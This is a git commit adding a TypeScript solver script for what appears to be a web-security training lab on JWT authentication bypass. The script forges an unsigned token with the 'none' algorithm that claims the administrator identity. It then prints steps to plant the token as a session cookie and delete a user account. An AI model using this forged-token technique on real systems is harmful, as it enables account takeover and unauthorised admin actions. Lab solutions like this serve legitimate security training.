f98d032e5232c696f06242375e4db9d830c257d9
Den <Den@example.com>
2024-06-21 12:49:51 +0300

    add lab: JWT authentication bypass via flawed signature verification

---
+++ src/labs/jwt/jwt_authentication_bypass_via_flawed_signature_verification/lab.ts
@@ -0,0 +1,26 @@
+import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
+import { runTasks } from "../../../utils/runTasks.js";
+
+const { labUrl } = getParsedInputFromUser({
+  description:
+    "Lab: JWT authentication bypass via flawed signature verification",
+});
+
+runTasks([task]);
+
+function task() {
+  console.log(`
+To solve the lab:
+  1. Edit your browser cookie for the lab site with key "session" and value "${getJwtToken()}"
+  2. Go to admin page:
+  "${labUrl + "admin"}"
+  3. Delete carlos's account
+`);
+}
+
+function getJwtToken() {
+  const adminUsername = "administrator";
+  const jwtHeader = JSON.stringify({ alg: "none" });
+  const jwtPayload = JSON.stringify({ sub: adminUsername });
+  return `${Buffer.from(jwtHeader).toString("base64url")}.${Buffer.from(jwtPayload).toString("base64url")}.`;
+}
